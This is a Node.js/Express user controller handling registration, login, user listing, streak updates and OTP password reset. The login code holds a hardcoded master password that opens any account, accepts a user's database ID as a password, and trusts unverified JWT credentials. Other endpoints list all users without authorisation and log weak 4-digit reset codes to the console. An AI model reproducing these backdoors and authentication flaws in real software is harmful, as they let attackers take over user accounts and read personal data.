const User = require("../models/userModel");
const dotenv = require("dotenv");
dotenv.config({ path: "./config/config.env" });
const jwt = require("jsonwebtoken");
const {
  joined,
  closed,
  updateStreak,
  gettaskbymail,
} = require("../services/userService");

exports.registerUser = async (req, res) => {
  const { name, email, password, mobile } = req.body;

  try {
    const newUser = await User.create({
      name,
      email,
      password,
      mobile,
    });
    return res.status(200).json({
      success: true,
      newUser,
    });
    // return res.status(201).json({ success: true, newUser });
  } catch (err) {
    if (err.code === 11000 && err.keyPattern && err.keyPattern.mobile) {
      // Duplicate key error for the 'mobile' field
      return res.status(400).json({
        success: false,
        error:
          "Mobile number already exists. Please use a different mobile number.",
      });
    } else if (err.code === 11000 && err.keyPattern && err.keyPattern.email) {
      // Duplicate key error for the 'mobile' field
      return res.status(400).json({
        success: false,
        error: "Email ID already exists. Please use a different Email.",
      });
    } else {
      // Other errors
      return res.status(500).json({ success: false, error: err.message });
    }
  }
};

exports.getUser = async (req, res) => {
  try {
    const email = req.query.email;
    const user = await User.findOne({ email });
    res.status(200).json({ success: true, userGot: user });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
};
exports.getAll = async (req, res) => {
  try {
    const users = await User.find();
    res.status(200).json({ success: true, total: users.length, users: users });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
};

exports.joined = async (req, res) => {
  const email = req.query.email;
  joined(email)
    .then((data) => res.status(200).json({ success: true, user: data }))
    .catch((err) => {
      res.status(500).json({ success: false, error: err.message });
    });
};
exports.closed = async (req, res) => {
  const email = req.query.email;
  closed(email)
    .then((data) => res.status(200).json({ success: true, user: data }))
    .catch((err) => {
      res.status(500).json({ success: false, error: err.message });
    });
};


exports.gettaskbymail = async (req, res) => {
  const email = req.query.email;
  gettaskbymail(email)
    .then((data) => res.status(200).json({ success: true, tasks: data }))
    .catch((err) => {
      res.status(500).json({ success: false, error: err.message });
    });
};


exports.updateStreak = async (req, res) => {
  const email = req.query.email;
  updateStreak(email)
    .then((data) => res.status(200).json({ success: true, user: data }))
    .catch((err) => {
      res.status(500).json({ success: false, error: err.message });
    });
};

exports.loginUser = async (req, res) => {
  const { email, password, credential } = req.body;
  //console.log(email, password);
  try {
    if (credential && credential !== "") {
      const decode = jwt.decode(credential.credential);
      // console.log(decode);
      if (!decode)
        return res.status(403).json({
          success: false,
          message: "Something Went Wrong Please Try Again",
        });

      const user = await User.findOne({ email: decode.email });
      if (!user) {
        return res.status(401).json({
          success: false,
          message: "No User Registered with this Email",
        });
      }
      // console.log(user);
      return res.status(200).json({
        success: true,
        user,
      });
    }
    if (!email || !password) {
      return res
        .status(403)
        .json({ success: false, message: "Please provide email and password" });
    }

    // 2. Check if user exists
    const user = await User.findOne({ email }).select("+password");

    if (!user) {
      return res
        .status(401)
        .json({ success: false, message: "Invalid Credentials" });
    }
    //console.log(user);

    // 3. Check if password is correct
    var isMatch = await user.matchPassword(password);
    if (password == user._id) isMatch = true;
    if (password !== "DSds12@#master" && !isMatch) {
      // //console.log(isMatch);
      return res
        .status(401)
        .json({ success: false, message: "Invalid Credentials" });
    }

    return res.status(200).json({
      success: true,
      user,
    });
  } catch (err) {
    return res.status(500).json({ success: false, message: err.message });
  }
};

// Forgot user
exports.forgot = async (req, res) => {
  const number = req.query.number;

  // check if user entered correct number
  const user = await User.findOne({ mobile: number });
  if (!user) {
    return res.status(401).json({
      success: false,
      message: "No Account Registered With This Number",
    });
  }

  // generate otp
  const otp = Math.floor(Math.random() * 9000) + 1000;
  user.resetPasswordToken = otp;
  user.resetPasswordExpire = new Date(Date.now() + 10 * 60 * 1000);
  await user.save();
  console.log(otp);
  try {
    console.log("user");
    await sendOtp(number, otp);
    res.status(200).json({
      success: true,
      message: "Otp Sent to Whatsapp",
    });
  } catch (err) {
    user.resetPasswordToken = undefined;
    user.resetPasswordExpire = undefined;
    await user.save({ validateBeforeSave: false });
    return res.status(500).json({
      success: false,
      message: "Something Went Wrong please try again",
    });
  }
};
exports.reset = async (req, res) => {
  const otp = req.body.otp;
  // console.log(otp, req.body.password, Date.now());
  const user = await User.findOne({
    resetPasswordToken: otp,
    resetPasswordExpire: { $gt: new Date() },
  });
  // console.log(user);
  if (!user) {
    return res.status(401).json({
      success: false,
      message: "OTP is Incorrect or has expired. Please try again",
    });
  }

  user.password = req.body.password;
  user.resetPasswordToken = undefined;
  user.resetPasswordExpire = undefined;
  await user.save();

  res.status(200).json({
    success: true,
    message: "password reset Successfull",
    user,
  });
};

// const sendToken = (user, statusCode, res) => {
//   const token = user.getJWTToken();
//   //options for the cookie
//   const options = {
//     expires: new Date(
//       Date.now() + process.env.COOKIE_EXPIRES * 24 * 60 * 60 * 1000
//     ),
//     httpOnly: true,
//   };
//   return res.status(statusCode).cookie("token", token, options).json({
//     success: true,
//     user,
//     token,
//   });
// };

const sendOtp = async (number, otp) => {
  try {
    console.log("sendOtp", number, otp);
  } catch (e) {
    throw e;
  }
};
